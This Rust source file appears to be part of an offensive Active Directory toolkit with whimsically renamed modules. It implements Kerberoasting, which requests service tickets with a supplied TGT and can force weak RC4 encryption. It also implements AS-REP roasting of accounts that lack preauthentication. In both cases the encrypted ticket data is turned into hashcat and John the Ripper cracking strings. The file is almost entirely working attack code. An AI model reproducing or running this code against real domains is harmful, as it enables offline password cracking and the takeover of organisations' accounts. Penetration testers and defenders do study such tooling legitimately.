use anyhow::{bail, Result};
use rand::random;

use crate::dungeon::krb_structures::*;
use crate::dungeon::floo_network;
use crate::dungeon::wand_utils;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum HashFormat {
    Hashcat,
    John,
}

pub struct RoastedHash {
    pub hash:  String,
    pub user:  String,
    pub spn:   String,
    pub etype: i32,
}

// ── Kerberoasting ─────────────────────────────────────────────────────────────

pub fn kerberoast_spn(
    spn: &str,
    domain: &str,
    tgt_kirbi: &[u8],
    request_rc4: bool,
    format: HashFormat,
) -> Result<RoastedHash> {
    let (user, realm, session_key) = parse_kirbi_identity(tgt_kirbi)?;
    let etype = if request_rc4 { ETYPE_RC4_HMAC } else { ETYPE_AES256_CTS_HMAC_SHA1_96 };

    let parts: Vec<&str> = spn.splitn(2, '/').collect();
    let sname = if parts.len() == 2 {
        Glyph { kind: NT_SRV_INST, parts: parts.iter().map(|s| s.to_string()).collect() }
    } else {
        Glyph::new_principal(spn)
    };

    let nonce: u32 = random();
    let ap_req = build_tgs_ap_req_for_roast(tgt_kirbi, &session_key, nonce)?;
    let pa_tgs = Rune::tgs_req(&ap_req);
    let tgs_req = TomeRequest::new_tgs_req(domain, sname, &[etype], vec![pa_tgs], nonce);
    let dc = floo_network::resolve_dc(domain)?;
    let resp_bytes = floo_network::send_receive_kdc(&dc, &tgs_req.encode())?;

    if DarkProphecy::is_error(&resp_bytes) {
        let e = DarkProphecy::decode(&resp_bytes)?;
        bail!("TGS-REP error for SPN {}: {} ({})", spn, error_string(e.error_code), e.error_code);
    }

    let rep = TomeReply::decode(&resp_bytes)?;
    let cipher_hex = wand_utils::bytes_to_hex(&rep.enc_part.cipher);
    let actual_etype = rep.enc_part.etype;
    let hash = format_tgs_hash(format, &user, &realm, spn, actual_etype, &cipher_hex);
    Ok(RoastedHash { hash, user, spn: spn.to_owned(), etype: actual_etype })
}

fn format_tgs_hash(fmt: HashFormat, user: &str, realm: &str, spn: &str, etype: i32, cipher_hex: &str) -> String {
    match etype {
        ETYPE_RC4_HMAC => {
            // checksum = first 32 hex chars (16 bytes), rest = ciphertext
            let (cksum, rest) = cipher_hex.split_at(32.min(cipher_hex.len()));
            match fmt {
                HashFormat::Hashcat =>
                    format!("$krb5tgs$23$*{}${}${}*${}${}", user, realm, spn, cksum, rest),
                HashFormat::John =>
                    format!("$krb5tgs${}@{}:{}:{}", user, realm, cksum, rest),
            }
        }
        ETYPE_AES128_CTS_HMAC_SHA1_96 | ETYPE_AES256_CTS_HMAC_SHA1_96 => {
            // checksum = last 24 hex chars (12 bytes)
            let rest = &cipher_hex[..cipher_hex.len().saturating_sub(24)];
            let cksum = &cipher_hex[cipher_hex.len().saturating_sub(24)..];
            let n = if etype == ETYPE_AES128_CTS_HMAC_SHA1_96 { 17 } else { 18 };
            match fmt {
                HashFormat::Hashcat =>
                    format!("$krb5tgs${}$*{}${}${}*${}${}", n, user, realm, spn, cksum, rest),
                HashFormat::John =>
                    format!("$krb5tgs${}${}@{}:{}:{}", n, user, realm, cksum, rest),
            }
        }
        _ => format!("unsupported etype {}: {}", etype, cipher_hex),
    }
}

// ── AS-REP Roasting ───────────────────────────────────────────────────────────

pub fn asrep_roast(
    username: &str,
    domain: &str,
    etype: i32,
    dc: Option<&str>,
    format: HashFormat,
) -> Result<RoastedHash> {
    let nonce: u32 = random();
    let cname = Glyph::new_principal(username);
    // No PA-ENC-TIMESTAMP → no preauth → AS-REP comes back encrypted with long-term key
    let padata = vec![Rune::pac_request(false)];
    let as_req = TomeRequest::new_as_req(cname, domain, &[etype], padata, nonce);
    let dc_addr = match dc {
        Some(d) => d.to_owned(),
        None => floo_network::resolve_dc(domain)?,
    };
    let resp_bytes = floo_network::send_receive_kdc(&dc_addr, &as_req.encode())?;

    if DarkProphecy::is_error(&resp_bytes) {
        let e = DarkProphecy::decode(&resp_bytes)?;
        bail!("AS-REP error for {}: {} ({})", username, error_string(e.error_code), e.error_code);
    }

    let rep = TomeReply::decode(&resp_bytes)?;
    let cipher_hex = wand_utils::bytes_to_hex(&rep.enc_part.cipher);
    let actual_etype = rep.enc_part.etype;
    let hash = format_asrep_hash(format, username, domain, actual_etype, &cipher_hex);
    Ok(RoastedHash { hash, user: username.to_owned(), spn: String::new(), etype: actual_etype })
}

fn format_asrep_hash(fmt: HashFormat, user: &str, domain: &str, etype: i32, cipher_hex: &str) -> String {
    match etype {
        ETYPE_RC4_HMAC => {
            match fmt {
                HashFormat::Hashcat => {
                    let (cksum, rest) = cipher_hex.split_at(32.min(cipher_hex.len()));
                    format!("$krb5asrep$23${}@{}:{}:{}", user, domain, cksum, rest)
                }
                HashFormat::John => {
                    let (cksum, rest) = cipher_hex.split_at(32.min(cipher_hex.len()));
                    format!("$krb5asrep${}@{}:{}${}", user, domain, cksum, rest)
                }
            }
        }
        ETYPE_AES128_CTS_HMAC_SHA1_96 | ETYPE_AES256_CTS_HMAC_SHA1_96 => {
            let rest = &cipher_hex[..cipher_hex.len().saturating_sub(24)];
            let cksum = &cipher_hex[cipher_hex.len().saturating_sub(24)..];
            let n = if etype == ETYPE_AES128_CTS_HMAC_SHA1_96 { 17 } else { 18 };
            match fmt {
                HashFormat::Hashcat =>
                    format!("$krb5asrep${}${}@{}:{}:{}", n, user, domain, cksum, rest),
                HashFormat::John =>
                    format!("$krb5asrep${}${}@{}:{}:{}", n, user, domain, cksum, rest),
            }
        }
        _ => format!("etype {} not supported for AS-REP roasting", etype),
    }
}

// ── Internal helpers ──────────────────────────────────────────────────────────

fn parse_kirbi_identity(kirbi: &[u8]) -> Result<(String, String, MagicKey)> {
    let mut p = DerParser::new(kirbi);
    let raw = p.expect_tag(TAG_KRB_CRED)?;
    let mut outer = DerParser::new(raw);
    let mut seq = outer.enter_sequence()?;
    seq.enter_ctx(0)?.read_uint32()?;
    seq.enter_ctx(1)?.read_uint32()?;
    let _tickets_raw = seq.slice_ctx(2)?;
    let enc_raw = seq.slice_ctx(3)?;
    let enc = SealedChamber::decode(enc_raw)?;
    let mut cp = DerParser::new(&enc.cipher);
    let cred_raw = cp.expect_tag(0x7d)?;
    let mut cseq = DerParser::new(cred_raw);
    let mut cseq2 = cseq.enter_sequence()?;
    let mut infos = cseq2.enter_ctx(0)?.enter_sequence()?;
    let (_, info_bytes) = infos.read_tlv()?;
    let mut ip = DerParser::new(info_bytes);
    let mut info_seq = ip.enter_sequence()?;
    let key = MagicKey::decode(info_seq.slice_ctx(0)?)?;
    let realm = if info_seq.peek_tag() == Some(ctx_tag(1)) {
        info_seq.enter_ctx(1)?.read_general_string()?
    } else { String::new() };
    let pname = if info_seq.peek_tag() == Some(ctx_tag(2)) {
        let b = info_seq.slice_ctx(2)?;
        Glyph::decode(b).map(|g| g.to_string()).unwrap_or_default()
    } else { String::new() };
    Ok((pname, realm, key))
}

fn build_tgs_ap_req_for_roast(kirbi: &[u8], session_key: &MagicKey, nonce: u32) -> Result<Vec<u8>> {
    // Parse ticket from kirbi
    let mut p = DerParser::new(kirbi);
    let raw = p.expect_tag(TAG_KRB_CRED)?;
    let mut outer = DerParser::new(raw);
    let mut seq = outer.enter_sequence()?;
    seq.enter_ctx(0)?.read_uint32()?;
    seq.enter_ctx(1)?.read_uint32()?;
    let tickets_raw = seq.slice_ctx(2)?;
    let mut tseq = DerParser::new(tickets_raw);
    let mut tlist = tseq.enter_sequence()?;
    let (_, ticket_bytes) = tlist.read_tlv()?;
    let mut wrapped = vec![TAG_TICKET];
    wrapped.extend_from_slice(&encode_length(ticket_bytes.len()));
    wrapped.extend_from_slice(ticket_bytes);
    let ticket = Scroll::decode_from_bytes(&wrapped)?;

    let now = wand_utils::generalized_time_now();
    let auth_inner = [
        encode_ctx(0, &encode_uint32(5)),
        encode_ctx(1, &encode_general_string(&ticket.realm)),
        encode_ctx(2, &ticket.sname.encode()),
        encode_ctx(4, &encode_generalized_time(&now)),
        encode_ctx(5, &encode_uint32(0)),
    ]
    .concat();
    let authenticator_plain = tlv(TAG_AUTHENTICATOR, &encode_sequence(&auth_inner));
    use crate::dungeon::potions;
    let sealed_auth = SealedChamber::new(
        session_key.keytype,
        potions::enchant(session_key.keytype, &session_key.keyvalue, KU_TGS_REQ_AUTH, &authenticator_plain)?,
    );
    let ap_req_inner = [
        encode_ctx(0, &encode_uint32(5)),
        encode_ctx(1, &encode_uint32(14)),
        encode_ctx(2, &encode_bit_string_flags(0)),
        encode_ctx(3, &ticket.encode()),
        encode_ctx(4, &sealed_auth.encode()),
    ]
    .concat();
    Ok(tlv(TAG_AP_REQ, &encode_sequence(&ap_req_inner)))
}
